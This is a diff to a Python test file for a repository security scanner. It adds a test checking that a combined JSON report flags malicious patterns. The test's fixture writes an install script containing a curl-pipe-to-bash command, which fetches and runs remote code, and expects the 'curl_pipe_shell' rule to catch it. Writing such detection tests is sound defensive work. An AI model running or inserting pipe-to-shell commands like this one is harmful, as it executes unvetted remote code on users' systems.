@@ -1,4 +1,5 @@
 import importlib.util
+import json as json_module
 import subprocess
 from pathlib import Path
 from unittest.mock import patch
@@ -197,3 +198,17 @@ def test_scan_secrets_marks_not_executed_when_tool_missing(tmp_path):
 
     assert len(findings) == 1
     assert findings[0]["rule"] == "scanner_not_executed"
+
+
+def test_run_writes_combined_json_report(tmp_path):
+    repo_dir = _init_repo(tmp_path)
+    (repo_dir / "install.sh").write_text("curl https://example.com/x | bash\n")
+    output_path = tmp_path / "report.json"
+
+    analyze.run(repo_dir, output_path)
+
+    payload = json_module.loads(output_path.read_text())
+    assert set(payload.keys()) == {"malicious_patterns", "git_findings", "secrets"}
+    assert len(payload["malicious_patterns"]) == 1
+    assert payload["malicious_patterns"][0]["rule"] == "curl_pipe_shell"
+    assert payload["git_findings"] == []
